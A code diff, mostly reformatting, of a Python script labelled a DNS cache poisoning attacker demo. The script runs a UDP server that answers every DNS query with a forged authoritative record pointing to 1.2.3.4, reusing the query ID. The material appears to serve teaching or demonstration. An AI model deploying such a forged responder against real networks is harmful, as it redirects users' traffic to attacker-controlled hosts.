@@ -8,10 +8,9 @@ A DNS cache poisoning attacker demo
 from time import sleep
 import dnslib
 from gevent.server import DatagramServer
-# from gevent import socket
-# from random import randint
 
 ALWAYS_RESPOND_IP = "1.2.3.4"
+
 
 class DNSServer(DatagramServer):
     """ This is the DNS server """
@@ -23,18 +22,19 @@ class DNSServer(DatagramServer):
         qname = str(req.q.qname)
         qid = req.header.id
 
-        response = dnslib.DNSRecord(dnslib.DNSHeader(qr=1, aa=1, ra=1),
-                                     q=dnslib.DNSQuestion(qname),
-                                     a=dnslib.RR(qname, rdata=dnslib.A(ALWAYS_RESPOND_IP)))
+        response = dnslib.DNSRecord(
+            dnslib.DNSHeader(qr=1, aa=1, ra=1),
+            q=dnslib.DNSQuestion(qname),
+            a=dnslib.RR(qname, rdata=dnslib.A(ALWAYS_RESPOND_IP))
+        )
 
         response.header.id = qid
         sleep(1.5)
         self.socket.sendto(response.pack(), address)
 
-
-    def handle(self, data, address):
-        """ handle of generic requests """
-        self.handle_dns_request(data, address)
+    # def handle(self, data, address):
+    #     """ handle of generic requests """
+    #     self.handle_dns_request(data, address)
 
 
 def main():
